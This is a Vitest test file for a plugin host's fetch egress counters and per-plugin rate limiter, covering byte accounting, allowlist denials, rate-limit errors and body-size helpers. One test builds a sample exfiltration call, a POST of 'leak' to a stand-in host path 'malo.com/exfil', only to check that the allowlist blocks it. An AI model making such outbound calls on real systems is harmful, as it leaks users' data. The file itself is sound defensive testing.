// @vitest-environment jsdom
/**
 * Tests for CORE-006b step 6 — egress accounting + per-plugin rate
 * limit on `PluginHost.handleFetch`.
 *
 * Coverage matrix:
 *
 *   • Counters
 *       1. Successful fetch → `requests++`, `bytesIn += body.length`,
 *          `bytesOut += approxBody(init.body)`.
 *       2. Allowlist denial inside ScopedFetch → still counted as a
 *          request (we attempted the call), bytesOut counted, bytesIn
 *          stays 0 (no response).
 *       3. Permission denial → still counted as a request (the gate
 *          ran and is observable workload).
 *
 *   • Rate limit
 *       4. The (N+1)th call within `windowMs` throws
 *          `RateLimitExceededError` with the configured numbers and a
 *          sane `retryAfterMs`. `rateLimitHits++`. Refused calls do
 *          NOT count towards `requests` (we never tried to send them).
 *       5. After advancing the clock past the window, a fresh call
 *          succeeds.
 *       6. `maxRequests: Infinity` disables the limiter entirely.
 *
 *   • Configurability
 *       7. Custom `{ maxRequests, windowMs }` is honored both in the
 *          gate and in the error fields.
 *
 *   • Defaults
 *       8. Default budget = 60 / 60_000.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type {
  EventBusReader,
  PluginContext,
  PluginManifest,
  PluginPermission,
  SimulatorEventListener,
  SimulatorEventName,
  SimulatorEvents,
} from '@velxio/sdk';

import {
  PluginHost,
  DEFAULT_FETCH_RATE_LIMIT,
  approximateBodyBytes,
  type WorkerLike,
} from '../plugins/runtime/PluginHost';
import { buildContextStub } from '../plugins/runtime/ContextStub';
import { RpcChannel, type RpcEndpoint } from '../plugins/runtime/rpc';

import { resetSettingsRegistryForTests } from '../plugin-host/SettingsRegistry';
import { resetLocaleStoreForTests } from '../plugin-host/I18nRegistry';
import { resetTemplateRegistryForTests } from '../plugin-host/TemplateRegistry';
import { resetLibraryRegistryForTests } from '../plugin-host/LibraryRegistry';

// ── fakes ────────────────────────────────────────────────────────────────

interface FakeBus extends EventBusReader {
  emit<K extends SimulatorEventName>(event: K, payload: SimulatorEvents[K]): void;
}

function fakeEventBus(): FakeBus {
  const listeners = new Map<SimulatorEventName, Set<SimulatorEventListener<SimulatorEventName>>>();
  return {
    on(event, fn) {
      let s = listeners.get(event);
      if (s === undefined) { s = new Set(); listeners.set(event, s); }
      s.add(fn as SimulatorEventListener<SimulatorEventName>);
      return () => { s!.delete(fn as SimulatorEventListener<SimulatorEventName>); };
    },
    hasListeners: (event) => (listeners.get(event)?.size ?? 0) > 0,
    listenerCount: (event) => listeners.get(event)?.size ?? 0,
    emit(event, payload) {
      const s = listeners.get(event);
      if (s === undefined) return;
      for (const fn of Array.from(s)) {
        try { (fn as SimulatorEventListener<typeof event>)(payload); } catch { /* ignore */ }
      }
    },
  };
}

function manifest(opts: {
  id?: string;
  perms?: PluginPermission[];
  allowlist?: ReadonlyArray<string>;
} = {}): PluginManifest {
  return {
    schemaVersion: 1,
    id: opts.id ?? 'egress.test',
    name: 'Egress Test',
    version: '1.0.0',
    publisher: { name: 'Tester' },
    description: 'plugin used by egress tests',
    icon: 'https://example.com/icon.svg',
    license: 'MIT',
    category: 'utility',
    tags: [],
    type: ['ui-extension'],
    entry: { module: 'index.js' },
    permissions: opts.perms ?? ['http.fetch'],
    pricing: { model: 'free' },
    refundPolicy: 'none',
    ...(opts.allowlist !== undefined ? { http: { allowlist: opts.allowlist } } : {}),
  } as unknown as PluginManifest;
}

function endpointFor(port: MessagePort): RpcEndpoint & { close(): void } {
  port.start();
  return {
    postMessage: (msg, transfer) => port.postMessage(msg, (transfer ?? []) as Transferable[]),
    addEventListener: (type, listener) => port.addEventListener(type, listener as EventListener),
    removeEventListener: (type, listener) => port.removeEventListener(type, listener as EventListener),
    close: () => port.close(),
  };
}

function makeFakeWorker(port: MessagePort): WorkerLike {
  const ep = endpointFor(port);
  return {
    postMessage: ep.postMessage,
    addEventListener: ep.addEventListener,
    removeEventListener: ep.removeEventListener,
    terminate: () => ep.close(),
  };
}

interface Fixture {
  readonly bus: FakeBus;
  readonly host: PluginHost;
  readonly ctx: PluginContext;
  readonly cleanup: () => void;
}

function spawn(opts: {
  perms?: PluginPermission[];
  allowlist?: ReadonlyArray<string>;
  fetchImpl: typeof fetch;
  rateLimit?: { maxRequests: number; windowMs: number };
} ): Fixture {
  const channel = new MessageChannel();
  const bus = fakeEventBus();
  const m = manifest({ perms: opts.perms, allowlist: opts.allowlist });
  const host = new PluginHost({
    manifest: m,
    worker: makeFakeWorker(channel.port1),
    services: { events: bus, fetchImpl: opts.fetchImpl },
    pingIntervalMs: 0,
    fetchRateLimit: opts.rateLimit,
  });
  const workerRpc = new RpcChannel(endpointFor(channel.port2));
  const stub = buildContextStub({ manifest: m, rpc: workerRpc });
  return {
    bus,
    host,
    ctx: stub.context,
    cleanup: () => {
      try { stub.dispose(); } catch { /* ignore */ }
      try { workerRpc.dispose(); } catch { /* ignore */ }
      try { host.terminate(); } catch { /* ignore */ }
      channel.port1.close();
      channel.port2.close();
    },
  };
}

const fixtures: Fixture[] = [];
function take(f: Fixture): Fixture { fixtures.push(f); return f; }

beforeEach(() => {
  resetSettingsRegistryForTests();
  resetLocaleStoreForTests();
  resetTemplateRegistryForTests();
  resetLibraryRegistryForTests();
});

afterEach(() => {
  while (fixtures.length > 0) { fixtures.pop()!.cleanup(); }
  vi.useRealTimers();
});

// Helper: synthesise a Response with a known body length.
function fakeResponse(bytes: number): Response {
  const buf = new Uint8Array(bytes);
  return new Response(buf, { status: 200, statusText: 'OK', headers: { 'content-length': String(bytes) } });
}

// ── tests ────────────────────────────────────────────────────────────────

describe('runtime · egress · counters', () => {
  it('a successful fetch increments requests, bytesIn, bytesOut', async () => {
    const f = take(spawn({
      allowlist: ['https://api.example.com/'],
      fetchImpl: async () => fakeResponse(128),
    }));
    await f.ctx.fetch('https://api.example.com/data', {
      method: 'POST',
      body: 'hello world', // 11 bytes
    });
    const stats = f.host.getStats().fetch;
    expect(stats.requests).toBe(1);
    expect(stats.bytesIn).toBe(128);
    expect(stats.bytesOut).toBe(11);
    expect(stats.rateLimitHits).toBe(0);
  });

  it('counts bytesOut across multiple string-body calls', async () => {
    const f = take(spawn({
      allowlist: ['https://api.example.com/'],
      fetchImpl: async () => fakeResponse(0),
    }));
    await f.ctx.fetch('https://api.example.com/a', { method: 'POST', body: 'twelve bytes' });
    await f.ctx.fetch('https://api.example.com/b', { method: 'POST', body: 'five!' });
    const stats = f.host.getStats().fetch;
    expect(stats.bytesOut).toBe(12 + 5);
    expect(stats.requests).toBe(2);
  });

  it('an allowlist denial counts as a request and counts bytesOut, but bytesIn stays 0', async () => {
    const f = take(spawn({
      allowlist: ['https://api.example.com/'],
      fetchImpl: async () => { throw new Error('underlying fetch must not run on a denied URL'); },
    }));
    await expect(
      f.ctx.fetch('https://malo.com/exfil', { method: 'POST', body: 'leak' }),
    ).rejects.toMatchObject({ name: 'HttpAllowlistDeniedError' });
    const stats = f.host.getStats().fetch;
    expect(stats.requests).toBe(1);
    expect(stats.bytesOut).toBe(4);
    expect(stats.bytesIn).toBe(0);
  });
});

describe('runtime · egress · rate limit', () => {
  it('the (N+1)th call within the window throws RateLimitExceededError with sane fields', async () => {
    vi.useFakeTimers();
    vi.setSystemTime(new Date('2026-04-24T00:00:00Z'));
    const f = take(spawn({
      allowlist: ['https://api.example.com/'],
      fetchImpl: async () => fakeResponse(0),
      rateLimit: { maxRequests: 3, windowMs: 1000 },
    }));
    await f.ctx.fetch('https://api.example.com/a');
    await f.ctx.fetch('https://api.example.com/b');
    await f.ctx.fetch('https://api.example.com/c');
    await expect(f.ctx.fetch('https://api.example.com/d'))
      .rejects.toMatchObject({
        name: 'RateLimitExceededError',
        pluginId: 'egress.test',
        maxRequests: 3,
        windowMs: 1000,
      });
    const stats = f.host.getStats().fetch;
    expect(stats.requests).toBe(3); // refused 4th NOT counted
    expect(stats.rateLimitHits).toBe(1);
  });

  it('after the window expires, a new call succeeds', async () => {
    vi.useFakeTimers();
    vi.setSystemTime(new Date('2026-04-24T00:00:00Z'));
    const f = take(spawn({
      allowlist: ['https://api.example.com/'],
      fetchImpl: async () => fakeResponse(0),
      rateLimit: { maxRequests: 2, windowMs: 1000 },
    }));
    await f.ctx.fetch('https://api.example.com/a');
    await f.ctx.fetch('https://api.example.com/b');
    await expect(f.ctx.fetch('https://api.example.com/c'))
      .rejects.toMatchObject({ name: 'RateLimitExceededError' });
    // Advance past the window.
    vi.setSystemTime(new Date('2026-04-24T00:00:01.500Z'));
    await f.ctx.fetch('https://api.example.com/d');
    const stats = f.host.getStats().fetch;
    expect(stats.requests).toBe(3); // 2 in first burst + 1 after recovery
    expect(stats.rateLimitHits).toBe(1);
  });

  it('the retryAfterMs hints at when the oldest stamp ages out', async () => {
    vi.useFakeTimers();
    vi.setSystemTime(new Date('2026-04-24T00:00:00Z'));
    const f = take(spawn({
      allowlist: ['https://api.example.com/'],
      fetchImpl: async () => fakeResponse(0),
      rateLimit: { maxRequests: 1, windowMs: 5_000 },
    }));
    await f.ctx.fetch('https://api.example.com/first');
    // Advance 2 s; refusal should hint we have 3 s to wait.
    vi.setSystemTime(new Date('2026-04-24T00:00:02Z'));
    let caught: { retryAfterMs?: number } | null = null;
    try {
      await f.ctx.fetch('https://api.example.com/second');
    } catch (e) {
      caught = e as { retryAfterMs?: number };
    }
    expect(caught).not.toBeNull();
    expect(caught!.retryAfterMs).toBe(3_000);
  });

  it('maxRequests: Infinity disables the limiter', async () => {
    const f = take(spawn({
      allowlist: ['https://api.example.com/'],
      fetchImpl: async () => fakeResponse(0),
      rateLimit: { maxRequests: Infinity, windowMs: 1000 },
    }));
    for (let i = 0; i < 50; i++) {
      await f.ctx.fetch('https://api.example.com/loop');
    }
    const stats = f.host.getStats().fetch;
    expect(stats.requests).toBe(50);
    expect(stats.rateLimitHits).toBe(0);
  });
});

describe('runtime · egress · defaults & exports', () => {
  it('DEFAULT_FETCH_RATE_LIMIT is 60 per 60_000 ms', () => {
    expect(DEFAULT_FETCH_RATE_LIMIT).toEqual({ maxRequests: 60, windowMs: 60_000 });
  });

  it('omitting fetchRateLimit applies the default budget', async () => {
    const f = take(spawn({
      allowlist: ['https://api.example.com/'],
      fetchImpl: async () => fakeResponse(0),
    }));
    // Don't try to exhaust 60 — that's expensive in tests. Just verify
    // the first call succeeds and the error message would carry the
    // default numbers if tripped (proxy via initial stats shape).
    await f.ctx.fetch('https://api.example.com/sanity');
    expect(f.host.getStats().fetch.requests).toBe(1);
  });
});

describe('runtime · egress · approximateBodyBytes', () => {
  // Direct unit tests — the end-to-end test can only exercise the string
  // path under jsdom because `MessagePort`'s structured-clone polyfill
  // loses `Uint8Array` identity (arrives as a plain Object with integer
  // keys). In a real Web Worker, structured clone preserves every shape
  // below; this block verifies the counter itself handles them.
  it('returns 0 for null and undefined', () => {
    expect(approximateBodyBytes(null)).toBe(0);
    expect(approximateBodyBytes(undefined)).toBe(0);
  });
  it('returns .length for strings (UTF-8 underestimate is accepted)', () => {
    expect(approximateBodyBytes('')).toBe(0);
    expect(approximateBodyBytes('abc')).toBe(3);
    expect(approximateBodyBytes('x'.repeat(10_000))).toBe(10_000);
  });
  it('returns byteLength for ArrayBuffer', () => {
    expect(approximateBodyBytes(new ArrayBuffer(128))).toBe(128);
  });
  it('returns byteLength for typed-array views', () => {
    expect(approximateBodyBytes(new Uint8Array(64))).toBe(64);
    expect(approximateBodyBytes(new Uint16Array(10))).toBe(20);
    expect(approximateBodyBytes(new Float64Array(4))).toBe(32);
  });
  it('returns size for Blob', () => {
    const b = new Blob(['hello!']);
    expect(approximateBodyBytes(b)).toBe(6);
  });
  it('returns encoded length for URLSearchParams', () => {
    const p = new URLSearchParams({ a: '1', b: '22' });
    expect(approximateBodyBytes(p)).toBe(p.toString().length);
  });
  it('returns 0 for FormData (we skip shapes we cannot introspect cheaply)', () => {
    const fd = new FormData();
    fd.append('k', 'v');
    expect(approximateBodyBytes(fd)).toBe(0);
  });
});
